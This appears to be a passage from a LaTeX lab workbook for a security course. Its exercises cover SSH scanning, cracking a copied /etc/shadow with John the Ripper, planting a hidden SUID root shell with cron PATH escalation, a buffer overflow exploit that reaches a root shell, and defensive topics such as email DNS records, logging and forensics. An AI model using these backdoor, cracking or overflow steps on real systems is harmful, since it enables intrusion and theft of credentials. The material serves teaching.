/usr/share/nmap/scripts/ssh-auth-methods.nse  /usr/share/nmap/scripts/ssh-run.nse
/usr/share/nmap/scripts/ssh-brute.nse	      /usr/share/nmap/scripts/sshv1.nse
/usr/share/nmap/scripts/ssh-hostkey.nse

$ sudo nmap -A -p 22 --script "ssh2-enum-algos,ssh-auth-methods" 10.0.45.2
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 08:46 CET
Nmap scan report for 10.0.42.6
Host is up (0.0038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     Cisco/3com IPSSHd 6.6.0 (protocol 2.0)
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey{\color{red}
|_    password}
| ssh2-enum-algos:
|   kex_algorithms: (1)
|       diffie-hellman-group1-sha1
|   server_host_key_algorithms: (1)
|       ssh-dss
|   encryption_algorithms: (6)
|       aes128-cbc
|       aes192-cbc
|       aes256-cbc
|       blowfish-cbc{\color{red}
|       cast128-cbc
|       3des-cbc}
|   mac_algorithms: (4)
|       hmac-sha1
|       hmac-sha1-96
|       hmac-md5
|       hmac-md5-96
|   compression_algorithms: (1)
|_      none
\end{alltt}

{\bf Solution:}\\
When you have tried running against one or two SSH servers, you are done.

{\bf Discussion:}\\
I recommend disabling password login on systems connected to the internet.

Having only public key authentication reduces or even removes the possibility for brute force attacks succeeding.

I also move the service to a random high port, which then requires an attacker must perform port scan to find it - more work.

Thus a better and more modern OpenSSH would look like this:
\begin{alltt}\footnotesize
PORT      STATE SERVICE VERSION
4xxxx/tcp open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
| ssh2-enum-algos:
|   kex_algorithms: (4)
|       curve25519-sha256@libssh.org
|       diffie-hellman-group16-sha512
|       diffie-hellman-group18-sha512
|       diffie-hellman-group14-sha256
|   server_host_key_algorithms: (4)
|       rsa-sha2-512
|       rsa-sha2-256
|       ssh-rsa
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (3)
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
\end{alltt}

\chapter{Password Cracking}
\label{ex:pwcrack-101}

{\bf Objective:}\\
Crack your own passwords using John the Ripper


{\bf Purpose:}\\
See how fast hashes from bad algorithms can be cracked, and how new ones are slow to crack.

{\bf Suggested method:}\\
John the Ripper is available from the web page, but also as a package:\\
\url{https://www.openwall.com/john/}

You should install from the package system using apt install, do apt search first to find the package name.

\begin{enumerate}
\item Install John, if not already there
\item Copy the local password database, as root: \verb+cp /etc/shadow /root/mypasswords+
\item Start cracking: \verb+john --single /root/mypasswords+
\item Restart with incremental mode, bruteforce: \verb+john --incremental /root/mypasswords+
\end{enumerate}

You can make it easier if you add a few users with bad passwords first.

{\bf Hints:}\\
You can download other sample hashes from\\
 \url{https://hashcat.net/wiki/doku.php?id=example_hashes}



{\bf Solution:}\\
When you have cracked at least one password then you are done.

{\bf Discussion:}\\
A better tool might be hashcat, found at:\\
\link{http://hashcat.net/wiki/}

This tool can be used with GPUs Graphical Processing Units / graphic cards for more speed.

Still I find John is often sufficient to crack bad passwords, and also for verification purposes it works great.

\chapter{Perform privilege escalation using files 30min}
\label{ex:priv-esc-cron}

{\bf Objective:}\\
Perform a simple privilege escalation attack

{\bf Purpose:}\\
Try and test a back door script.

{\bf Suggested method:}\\

\begin{enumerate}
\item Create a shell copy with SUID bit set as privileged user
\item Run the command as non-privileged user to see it works
%\item Create root cronjob without path
%\item Insert a malicious script as one of the commands from the root cron job
\end{enumerate}

{\bf Hints:}\\
A cron job runs scheduled commands. They usually perform cleanup functions, removing old files, doing a backup or similar

In this exercise first try out the malicious commands for creating a back door shell program. Login in as root, then:

\begin{alltt}
root@debian:~# rm /tmp/.xxsh
root@debian:~# cp /bin/zsh /tmp/.xxsh
root@debian:~# chmod +sw /tmp/.xxsh
\end{alltt}

Then test using a normal user, another window:
\begin{alltt}
hlk@debian:~$ /tmp/.xxsh
# id
uid=1000(hlk) gid=1000(hlk) {\bf euid=0(root) egid=0(root)} groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),117(scanner),1000(hlk) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
#
\end{alltt}

The effective user id should be 0 which is root.

When this manual process work. Then automate it, make it into a script like in the book. Imagine if the root user was running automated scripts, and you could add yours to a directory used in the PATH for these automated ones.

This happens in a lot of devices and hosts today.

The main takeaway is that root scripts should ALWAYS have a PATH defined, and ALL directories used by root script should only be writable by root!

{\bf Solution:}\\
When you have created the script for doing the shell copy you are done.

Further advanced steps would be to add this into some PATH writable by you, and letting a cron job escalate.

 Then do a cron job that uses this command - a cron job running every 5 minutes using the \verb+ls+ command and introduce your malicious script by putting it before the real command in the PATH.



{\bf Discussion:}\\
This was chosen as I found a similar vulnerability in a professional product, in 2019


\chapter{Anti-virus and "endpoint security" 20min}
\label{ex:anti-virus-end-point-security}

{\bf Objective:}\\
Discuss when to use Anti-virus and "endpoint security"

{\bf Purpose:}\\
Anti-virus programs have been shown to catch some viruses, useful.

Anti-virus programs have been shown to be insecure programs that also slows down systems, counter-productive and increases target surface and exposure.

{\bf Suggested method:}\\
Sit in groups 3-5 -- discuss among yourselves. Write down plus and minus for using anti-virus -- especially which use-cases should use AV, and which shouldn't.

{\bf Hints:}\\
In some cases people have installed AV products for check-mark security, the check-list said to have AV, so we installed a mail scanner on this web server -- bad security.

{\bf Solution:}\\
When we have done a collected talk and discussion we are done.

{\bf Discussion:}\\
I dont use anti-virus products at all. I do use a lot of backup though.

Which is more trust-worthy - a restored system or a system cleaned by random anti-virus program?

\chapter{Buffer Overflow 101 - 30-40min}
\label{ex:bufferoverflow}


{\bf Objective:}\\
Run a demo program with invalid input - too long.

{\bf Purpose:}\\
See how easy it is to cause an exception.

{\bf Suggested method:}\\

\begin{list2}
\item Small demo program \verb+demo.c+
\item Has built-in shell code, function \verb+the_shell+
\item Compile:
\verb+gcc -o demo demo.c+
\item Run program
\verb+./demo test+
\item Goal: Break and insert return address
\end{list2}

\begin{minted}[fontsize=\footnotesize]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char **argv)
{      char buf[10];
        strcpy(buf, argv[1]);
        printf("%s\n",buf);
}
int the_shell()
{  system("/bin/dash");  }
\end{minted}

NOTE: this demo is using the dash shell, not bash - since bash drops privileges and won't work.

Use GDB to repeat the demo by the instructor.

{\bf Hints:}\\
First make sure it compiles:
\begin{alltt}
\$ gcc -o demo demo.c
\$ ./demo hejsa
hejsa
\end{alltt}

Make sure you have tools installed:
\begin{alltt}
apt-get install gdb
\end{alltt}

Then run with debugger:

\begin{alltt}
\$ gdb demo
GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from demo...(no debugging symbols found)...done.
(gdb) {\bf
(gdb) run `perl -e "print 'A'x22; print 'B'; print 'C'"`}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)
// OR
(gdb) {\bf
(gdb) run $(perl -e "print 'A'x22; print 'B'; print 'C'")}
Starting program: /home/user/demo/demo `perl -e "print 'A'x22; print 'B'; print 'C'"`
AAAAAAAAAAAAAAAAAAAAAABC

Program received signal SIGSEGV, Segmentation fault.
0x0000434241414141 in ?? ()
(gdb)

\end{alltt}

Note how we can see the program trying to jump to address with our data. Next step would be to make sure the correct values end up on the stack.

{\bf Solution:}\\
When you can run the program with debugger as shown, you are done.

{\bf Discussion:}\\

the layout of the program - and the address of the \verb+the_shell+ function can be seen using the command \verb+nm+:
\begin{alltt}\footnotesize
\$ nm demo
0000000000201040 B __bss_start
0000000000201040 b completed.6972
                 w __cxa_finalize@@GLIBC_2.2.5
0000000000201030 D __data_start
0000000000201030 W data_start
0000000000000640 t deregister_tm_clones
00000000000006d0 t __do_global_dtors_aux
0000000000200de0 t __do_global_dtors_aux_fini_array_entry
0000000000201038 D __dso_handle
0000000000200df0 d _DYNAMIC
0000000000201040 D _edata
0000000000201048 B _end
0000000000000804 T _fini
0000000000000710 t frame_dummy
0000000000200dd8 t __frame_dummy_init_array_entry
0000000000000988 r __FRAME_END__
0000000000201000 d _GLOBAL_OFFSET_TABLE_
                 w __gmon_start__
000000000000081c r __GNU_EH_FRAME_HDR
00000000000005a0 T _init
0000000000200de0 t __init_array_end
0000000000200dd8 t __init_array_start
0000000000000810 R _IO_stdin_used
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
0000000000200de8 d __JCR_END__
0000000000200de8 d __JCR_LIST__
                 w _Jv_RegisterClasses
0000000000000800 T __libc_csu_fini
0000000000000790 T __libc_csu_init
                 U __libc_start_main@@GLIBC_2.2.5
0000000000000740 T main
                 U puts@@GLIBC_2.2.5
0000000000000680 t register_tm_clones
0000000000000610 T _start
                 U strcpy@@GLIBC_2.2.5
                 U system@@GLIBC_2.2.5
000000000000077c T the_shell
0000000000201040 D __TMC_END__
\end{alltt}

The bad news is that this function is at an address \verb+000000000000077c+ which is hard to input using our buffer overflow, please try \smiley We cannot write zeroes, since strcpy stop when reaching a null byte.

We can compile our program as 32-bit using this, and disable things like ASLR, stack protection also:
\begin{alltt}
sudo apt-get install gcc-multilib
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
gcc -m32 -o demo demo.c -fno-stack-protector -z execstack -no-pie
\end{alltt}

Then you can produce 32-bit executables:
\begin{alltt}\footnotesize
// Before:
user@debian-9-lab:~/demo$ file demo
demo: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=82d83384370554f0e3bf4ce5030f6e3a7a5ab5ba, not stripped
// After - 32-bit
user@debian-9-lab:~/demo$ gcc -m32 -o demo demo.c
user@debian-9-lab:~/demo$ file demo
demo: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5fe7ef8d6fd820593bbf37f0eff14c30c0cbf174, not stripped
\end{alltt}

And layout:
\begin{alltt}\footnotesize
0804a024 B __bss_start
0804a024 b completed.6587
0804a01c D __data_start
0804a01c W data_start
...
080484c0 T the_shell
0804a024 D __TMC_END__
080484eb T __x86.get_pc_thunk.ax
080483a0 T __x86.get_pc_thunk.bx
\end{alltt}


Successful execution would look like this - from a Raspberry Pi:
\begin{alltt}\footnotesize
\$ gcc -o demo demo.c
\$ nm demo | grep the_shell
000104ec T the_shell
\$

...
(gdb) run `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/pi/demo/demo `perl -e " print 'A'x16; print chr(0xec) . chr(04)  . chr (0x01);" `
AAAAAAAAAAAAAAAA
\$
\end{alltt}

Started a new shell.

you can now run the "exploit" - which is the shell function AND the misdirection of the instruction flow by overflow:
\begin{alltt}\footnotesize
pi@raspberrypi:~/demo $ gcc -o demo demo.c
pi@raspberrypi:~/demo $ sudo chown root.root demo
pi@raspberrypi:~/demo $ sudo chmod +s demo
pi@raspberrypi:~/demo $ id
uid=1000(pi) gid=1000(pi) grupper=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
pi@raspberrypi:~/demo $ ./demo `perl -e " print 'A'x16; print chr(0xec).chr(04).chr(0x01);" `
AAAAAAAAAAAAAAAA
# id
uid=1000(pi) gid=1000(pi) euid=0(root) egid=0(root) grupper=0(root),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi),1000(pi)
#

\end{alltt}




\chapter{Small programs with data types 15min}
\label{ex:c-types}

{\bf Objective:}\\
Try out small programs similar to:
\inputminted{c}{programs/int1.c}

\begin{alltt} \footnotesize
user@Projects:programs$ gcc -o int1 int1.c && ./int1
First debug int is 32767
Second debug int is now -32768
\end{alltt}

{\bf Purpose:}\\
See actual overflows when going above the maximum for the selected types.


{\bf Suggested method:}\\
Compile program as is. Run it. See the problem. Then try changing the int type, try without short, and with signed and unsigned. Note differences

{\bf Hints:}\\
Use a calculator to find the maximum, like $2^{16}$, $2^{32}$ etc.

{\bf Solution:}\\
When you have tried adding one to a value and seeing it going negative, you are done.

{\bf Discussion:}\\
Computers are not always correct when doing calculations. Above was shown with integers, and it is even worse for floating point.

\begin{quote}\footnotesize
The IEEE Standard for Floating-Point Arithmetic (IEEE 754) is a technical standard for floating-point arithmetic established in 1985 by the Institute of Electrical and Electronics Engineers (IEEE). The standard addressed many problems found in the diverse floating-point implementations that made them difficult to use reliably and portably. Many hardware floating-point units use the IEEE 754 standard.
\end{quote}

Source: \url{https://en.wikipedia.org/wiki/IEEE_754}


\chapter{Real Vulnerabilities up to 30min}
\label{ex:real-vulns-exim}



{\bf Objective:}\\
Look at real vulnerabilities. Choose a few real vulnerabilities, prioritize them.

{\bf Purpose:}\\
See that the error types described in the books - are still causing problems.



{\bf Suggested method:}\\
We will use the 2019 Exim errors as examples. Download the descriptions from:
\begin{list2}
\item Exim RCE CVE-2019-10149 June\\ \url{https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt}

\item Exim RCE CVE-2019-15846 September\\
\url{https://exim.org/static/doc/security/CVE-2019-15846.txt}
\end{list2}

When done with these think about your own dependencies. What software do you depend on? How many vulnerabilities and CVEs are for that?

I depend on the OpenBSD operating system, and it has flaws too:\\
\url{https://www.openbsd.org/errata65.html}

You may depend on OpenSSH from the OpenBSD project, which has had a few problems too:\\
\url{https://www.openssh.com/security.html}

{\bf Hints:}\\
Remote Code Execution can be caused by various things, but most often some kind of input validation failure.

{\bf Solution:}\\
When you have identified the specific error type, is it buffer overflows? Then you are done.

{\bf Discussion:}\\
How do you feel about running internet services. Lets discuss how we can handle running insecure code.

What other methods can we use to restrict problems caused by similar vulnerabilities.

A new product will often use a generic small computer and framework with security problems.


\chapter{Email Security -- up to 45min}
\label{ex:email-security}

{\bf Objective:}\\
Talk and plan roll-out of security mechanisms based on DNS records. Domain Name System. Check you personal domain and domain used for work. If you are new to this I suggest experimenting with your own personal domain, or create one.

{\bf Purpose:}\\
Make sure everyone attending know about methods to restrict sending of false emails, how to secure this using DNSSEC, SPF, DMARC - DNS based updates to your email domain security


{\bf Email security - Goals}

\begin{itemize}
\item SPF Sender Policy Framework\\ {\footnotesize\url{https://en.wikipedia.org/wiki/Sender_Policy_Framework}}
\item DKIM DomainKeys Identified Mail\\
{\footnotesize\url{https://en.wikipedia.org/wiki/DomainKeys_Identified_Mail}}
\item DMARC Domain-based Message Authentication, Reporting and Conformance\\
{\footnotesize\url{https://en.wikipedia.org/wiki/DMARC}}
\item DANE DNS-based Authentication of Named Entities\\ {\footnotesize\url{https://en.wikipedia.org/wiki/DNS-based_Authentication_of_Named_Entities}}
\item Brug allesammen, check efter ændringer!
\end{itemize}

DNS-based Authentication of Named Entities (dane)
\begin{quote}\footnotesize
"TLSA records store hashes of remote server TLS/SSL certificates. The authenticity of a TLS/SSL certificate for a domain name is verified by DANE protocol (RFC 6698). DNSSEC and TLSA validation results are displayer by using several icons."
\end{quote}


{\bf Suggested method:}\\
Use services on the internet, such as \link{https://internet.nl/} and \link{https://dmarcian.com/} to see current status for your domains.

{\bf Hints:}\\
I suggest the following strategy when you implement these methods, if you dare do it right now. If you make a plan.

{\bf Basic mail security}
\begin{enumerate}
\item Implement DNSSEC - turn it on, most likely easy
\item Configure Sender Policy Framework, perhaps only \verb+~all+ tilde means soft fail
\item Configure DomainKeys Identified Mail
\item Configure receiving email address for DMARC
\item Configure Domain-based Message Authentication - reject none
\end{enumerate}

Spend some time trying different tools for DMARC reporting. A month or a week, depending on the domain and your users. Github alone has 100s of projects concerned with parsing, reporting and working with DMARC.

Then after some time has passed, and you have reviewed reporting from DMARC, turn it on for real:
\begin{enumerate}
\item Configure SPF to disallow with hard fail use \verb+-all+ minus
\item Configure DMARC with reject - reject emails not following policy
\end{enumerate}

{\bf Advanced mail security}
\begin{enumerate}
\item Create real certificates for DANE
\item Publish them \smiley
\end{enumerate}

Helpful hints from \link{https://blog.apnic.net/2017/01/06/lets-encrypt-dane/}


{\bf Solution:}\\
When the internet is ridden of falsified spam you are done \smiley\ - its up to you.

Take domain(s) of your choice and make a table:

\begin{tabularx}{\textwidth}{|X|l|l|l|l|l|l|} \hline
Domain \faEnvelopeO & DNS NS 2+ & DNSSEC & SPF & DKIM & DMARC & DANE \\\hline
zencurity.com & \faCheck & \faCheck & \faCheck &  & \faCheck & \\ \hline

 &  &  &  & & & \\\hline
 &  &  &  & & & \\\hline
\end{tabularx}

{\bf Discussion:}\\
You need to research before making changes to important domains.
If you have domains that \emph{never send email} then add the following SPF and DMARC to avoid misuse.

My own DNS template for \emph{parked domains}:
\begin{alltt}
gdns.template	v=spf1 -all	43200
_dmarc.gdns.template	v=DMARC1; p=reject;	43200
\end{alltt}



\chapter{Research Virtual Machine Escapes 20min}
\label{ex:vm-escape}


{\bf Objective:}\\
Research how exploits currently as escaped from Guest Virtual Machine to Host operating system. Multiple examples exist for both client virtualisation and datacenter virtualisation.

{\bf Purpose:}\\
Research VM escapes - understand that isolation and separation does not always work. Think about how to design systems with this in mind.

Perhaps virtualisation should be built using two clusters, one for external services and one for internal?

{\bf Suggested method:}\\
Find list of CVE or do internet search. Perform searches using the virtualisation technology used in your networks. Note: even though Virtual box is used as example below other technologies like Microsoft HyperV, VMware, Xen etc. have similar problems!


examples:

\begin{itemize}
\item \link{https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=virtualbox} list multiple vulnerabilities.
\item \url{https://github.com/MorteNoir1/virtualbox_e1000_0day} \emph{VirtualBox E1000 Guest-to-Host Escape} The E1000 has a vulnerability allowing an attacker with root/administrator privileges in a guest to escape to a host ring3. Then the attacker can use existing techniques to escalate privileges to ring 0 via /dev/vboxdrv.
\end{itemize}

{\bf Hints:}\\
Providing virtualisation is today done using hardware features in the CPU of the system. Along with the hardware features are drivers and features provided by the virtualisation system, which has errors.

Having drivers and kernel modules with errors can sometimes result in flaws exploitable by guest virtual machines.

{\bf Solution:}\\
There is no solution other than to patch systems, when new vulnerabilities are found - update your virtualisation NOW if you are missing updates.

Never open virtual machines from untrusted sources on your laptop with confidential data. Don't trust that the security provided is enough for researching live malware on virtual systems.

{\bf Discussion:}\\
Is it possible to create multiple virtualisation cluster? - yes, some organisations already have multiple clusters for various reasons. Some might have development, staging and production as different clusters.

Also be aware that a lot of malware has checks trying to find out if it is running in a virtual machine, or isolated in a lab.




\chapter{Try running a Docker container 20min}
\label{ex:docker-run}


{\bf Objective:}\\
Research how Docker containers work.

{\bf Purpose:}\\
Docker containers are used all around the world, often together with private cloud systems.

They run in the host OS kernel, and thus requires fewer resources, and provides less isolation.

\begin{quote}
The underlying technology\\
Docker is written in the Go programming language and takes advantage of several features of the Linux kernel to deliver its functionality. Docker uses a technology called namespaces to provide the isolated workspace called the container. When you run a container, Docker creates a set of namespaces for that container.

These namespaces provide a layer of isolation. Each aspect of a container runs in a separate namespace and its access is limited to that namespace.
\end{quote}
Source: \url{https://docs.docker.com/get-started/overview/}

{\bf Suggested method:}\\
Find the main web page of Docker, \url{https://www.docker.com}

Look at the architecture of Docker, they currently have an article:\\
\url{https://www.docker.com/resources/what-container}

What is a Container?\\
A standardized unit of software

Browse the architecture for a bit, and then run docker on your Debian.

The instruction are on the page:\\
\url{https://docs.docker.com/engine/install/debian/}

{\bf Hints:}\\
I recommend using the repositories, as future updates will become available there. This make future apt update/upgrade more simple.

{\bf Solution:}\\
When you understand the basic architecture of Docker containers, you are done.

or

When you can run a small docker container, you are done.


\begin{minted}[fontsize=\footnotesize]{shell}
docker run hello-world
\end{minted}


{\bf Discussion:}\\
Many software packages can be used via Docker containers. This allows the programmer to prepare a small image, and the user to run this directly.

Are there any security issues, many, so be careful.

See for example: \\
\url{https://docs.docker.com/engine/security/}


\chapter{Centralized syslog 15min}
\label{ex:centralized-syslog-practical}

{\bf Objective:} \\
See how server syslog is configured on regular Unix/Linux.

Centralized syslogging and example system can demonstrate how easy it is to get started

{\bf Purpose:}\\
The main idea of this exercise is to understand how easy network connected systems can send log data.

This should be the common case, sending logs off system - to avoid an attacker being able to hide tracks and logs from exploits performing intrusion and escalation.

{\bf Suggested method:}\\
Log into your local Linux systems or network devices, see how syslog is configured.

{\bf Hints:}\\
Look in the config file, may be in /etc/syslog  or /etc/syslog-ng/syslog-ng.conf

Sample output from old-skool syslogd
\begin{alltt}
\small
*.err;kern.debug;auth.notice;authpriv.none;mail.crit    /dev/console
*.notice;auth,authpriv,cron,ftp,kern,lpr,mail,user.none /var/log/messages
kern.debug;user.info;syslog.info                        /var/log/messages
auth.info                                               /var/log/authlog
authpriv.debug                                          /var/log/secure
...
# Uncomment to log to a central host named "loghost".
#*.notice;auth,authpriv,cron,ftp,kern,lpr,mail,user.none        @loghost
#kern.debug,user.info,syslog.info                               @loghost
#auth.info,authpriv.debug,daemon.info                           @loghost
\end{alltt}

{\bf Solution:}\\
When you understand how to configure syslog from a couple of devices and has looked up which protocol and port it uses. (default is 514/udp)

{\bf Discussion:}\\
There are syslog senders for Windows too. Other systems define their own format for sending, example Beats - lightweight data shippers \link{https://www.elastic.co/products/beats }

I recommend using the elastic stack, previously the ELK stack, \link{https://www.elastic.co/products/}. The products can be used without license and can give a lot of experience with this kind of product. This will enable you to better describe your logging needs for evaluating other products.

This is done using Logstash as the server - can also receive SNMP traps!

Logstash is an open source, server-side data processing pipeline that ingests data from a multitude of sources simultaneously, transforms it, and then sends it to your favorite “stash.” - often Elasticsearch
\link{https://www.elastic.co/products/logstash}

Other very popular systems are:

\begin{itemize}
\item Splunk \link{https://www.splunk.com}
\item Graylog \link{https://www.graylog.org/}
\item InfluxDB \link{https://www.influxdata.com/}
\item Grafana The open platform for analytics and monitoring \link{https://grafana.com/}
\item Prometheus Monitoring system \& time series database \link{https://prometheus.io/}
\end{itemize}

Remember doing logging og performance metrics can also become a security charateristics. Availability is a critical metric for most commercial systems.


\chapter{Getting started with the Elastic Stack 15 min}
\label{gettingstartedelastic}

\hlkimage{10cm}{illustrated-screenshot-hero-kibana.png}

Screenshot from \url{https://www.elastic.co/kibana}

{\bf Objective:}\\
Get ready to start using Elasticsearch, read - but dont install.

{\bf Purpose:}\\
We need some tools to demonstrate integration. Elasticsearch is a search engine and ocument store used in a lot of different systems, allowing cross application integration.


{\bf Suggested method:}\\
Visit the web page for \emph{Getting started with the Elastic Stack} :\\
{\footnotesize\url{https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html}}

Read about the tools, and the steps needed for manual installation.

{\bf You dont need to install the tools currently}, I recommend using Debian and Ansible for bringing up Elasticsearch.
You are of course welcome to install, or try the Docker method.


{\bf Hints:}\\
Elasticsearch is the name of the search engine and document store. Today Elastic Stack contains lots of different parts.

We will focus on these parts:
\begin{itemize}
\item Elasticsearch - the core engine
\item Logstash - a tool for parsing logs and other data.\\
\url{https://www.elastic.co/logstash}
\begin{quote}
"Logstash dynamically ingests, transforms, and ships your data regardless of format or complexity. Derive structure from unstructured data with grok, decipher geo coordinates from IP addresses, anonymize or exclude sensitive fields, and ease overall processing."
\end{quote}
\item Kibana - a web application for accessing and working with data in Elasticsearch\\
\url{https://www.elastic.co/kibana}
\end{itemize}

{\bf Solution:}\\
When you have browsed the page you are done.

{\bf Discussion:}\\
You can read more about Elasticsearch at the wikipedia page:\\
\url{https://en.wikipedia.org/wiki/Elasticsearch}


\chapter{Use Ansible to install Elastic Stack}
\label{ex:basicansiblees}


{\bf Objective:}\\
Run Elasticsearch

{\bf Purpose:}\\
See an example tool used for many integration projects, Elasticsearch from the Elastic Stack

{\bf Suggested method:}\\
We will run Elasticsearch, either using the method from:\\{\footnotesize
\url{https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html}}

or by the method described below using Ansible - your choice.

Ansible used below is a configuration management tool \url{https://www.ansible.com/}

I try to test my playbooks using both Ubuntu and Debian Linux, but Debian is the main target for this training.

First make sure your system is updated, as root run:

\begin{minted}[fontsize=\footnotesize]{shell}
apt-get update && apt-get -y upgrade && apt-get -y dist-upgrade
\end{minted}

You should reboot if the kernel is upgraded :-)

Second make sure your system has ansible and my playbooks: (as root run)
\begin{minted}[fontsize=\footnotesize]{shell}
apt -y install ansible git
git clone https://github.com/kramse/kramse-labs
\end{minted}

We will run the playbooks locally, while a normal Ansible setup would use SSH to connect to the remote node.

Then it should be easy to run Ansible playbooks, like this: (again as root, most packet sniffing things will need root too later)

\begin{minted}[fontsize=\footnotesize]{shell}
cd kramse-labs/suricatazeek
ansible-playbook -v 1-dependencies.yml 2-suricatazeek.yml 3-elasticstack.yml
\end{minted}

Note: I keep these playbooks flat and simple, but you should investigate Ansible roles for real deployments.

If I update these, it might be necessary to update your copy of the playbooks. Run this while you are in the cloned repository:

\begin{minted}[fontsize=\footnotesize]{shell}
git pull
\end{minted}

Note: usually I would recommend running git clone as your personal user, and then use sudo command to run some commands as root. In a training environment it is OK if you want to run everything as root. Just beware.

Note: these instructions are originally from the course\\
Go to \url{https://github.com/kramse/kramse-labs/tree/master/suricatazeek}

{\bf Hints:}\\
Ansible is great for automating stuff, so by running the playbooks we can get a whole lot of programs installed, files modified - avoiding the Vi editor \smiley

Example playbook content
\begin{alltt}
apt:
      name: "{{ packages }}"
    vars:
      packages:
        - nmap
        - curl
        - iperf
        ...
\end{alltt}

{\bf Solution:}\\
When you have a updated VM and Ansible running, then we are good.

{\bf Discussion:}\\
Linux is free and everywhere. The tools we will run in this course are made for Unix, so they run great on Linux.


\chapter{Create Kibana Dashboard 15min}
\label{ex:kibana-dashboard}

\hlkimage{12cm}{kibanascreenshothomepagebannerbigger.jpg}

{\bf Objective:}\\
See Kibana and understand how it is configured.

{\bf Purpose:}\\
Kibana is a very popular system for creating dashboards from data in elasticsearch.

Learning how to create and import dashboards is a good exercise.

{\bf Suggested method:}\\
Instructor will provide a running Elasticsearch and Kibana for this exercise.

Note: usually Kibana should be available on port 5601 on localhost (127.0.0.1) only! It is recommended to keep this configuration and then add a web server like Nginx or Apache in front. This will further allow authentication and other features.

Using Firefox visit Kibana on the link provided by the instructor.

If this is the first time you need to
 select \verb+logstash-*+ as a default index. Note: Kibana is an advanced and powerful tool in itself.

Read how dashboards can be loaded using shell command, example the ones from:
\link{https://github.com/StamusNetworks/KTS6}

The commands are similar to
\begin{alltt}
git clone https://github.com/StamusNetworks/KTS7.git
cd KTS7
bash load.sh
\end{alltt}

Note: KTS version needs to match Elasticsearch version! So for ES version 7, use KTS7

{\bf Hints:}\\
Logstash and Elastic stack are a great way to get started with dashboarding.

However, running a big installation is harder than it looks. Make sure to have multiple servers and good monitoring.

{\bf Solution:}
When you have browsed Kibana, seen how you can add graphs and combine them into dashboards - using the GUI you are done. Previously creating dashboards was harder and often required programming knowledge.

{\bf Discussion:}\\
Making dashboard are an art form. We will NOT start creating beautiful dashboards.

If you want, there is a SELKS LiveCD dedicated to suricata which also includes more tools for administration of rules and getting alerts:\\
\link{https://www.stamus-networks.com/open-source/}


\chapter{File System Forensics 30min}
\label{ex:file-system-forensics}

\hlkimage{4cm}{sleuthkit.png}
{\bf Objective:}\\
 Open a file system dump

{\bf Purpose:}\\
Learn a bit of computer forensics using a free tool.

{\bf Suggested method:}\\
We will use a free toolkit, and an older version - easier to install.

The Sleuth Kit® is a collection of command line tools and a C library that allows you to analyze disk images and recover files from them. It is used behind the scenes in Autopsy and many other open source and commercial forensics tools.

Autopsy® is an easy to use, GUI-based program that allows you to efficiently analyze hard drives and smart phones. It has a plug-in architecture that allows you to find add-on modules or develop custom modules in Java or Python.

\link{http://www.sleuthkit.org/}


\begin{enumerate}
\item Install tools
\item Acquire test images - download file system images
\item Open test images using tools
\end{enumerate}

Installing the tools is described on the web page, but using apt on Kali Linux should be OK. Note: this is not the newest version!

Test images can be found at:\\
\link{http://dftt.sourceforge.net/}

Example, the EXT3FS file system:\\
\link{http://dftt.sourceforge.net/test4/index.html}

For this do the following - tested on Kali Linux:
\begin{enumerate}
\item Install tools\\
\verb+apt-get install autopsy sleuthkit testdisk+
\item Acquire test images - download and unzip\\
\verb+cd ~; mkdir forensic;cd ~/forensic;unzip  +
\item Start autopsy from command line
\item Open test images using tools, use a browser \link{http://localhost:9999/autopsy}
\item Add a new case, fill out wizards case: "My case", investigator: "hlk"
\item Add host, fill out wizard, name: "host1", time zone: "CEST"
\item Add image file - location full path to the file containing a file system, choose type: "partition" with symlink is fine
\item Then use the analyze button to start analyzing this file system
\item Click and get a feel for the tool
\end{enumerate}

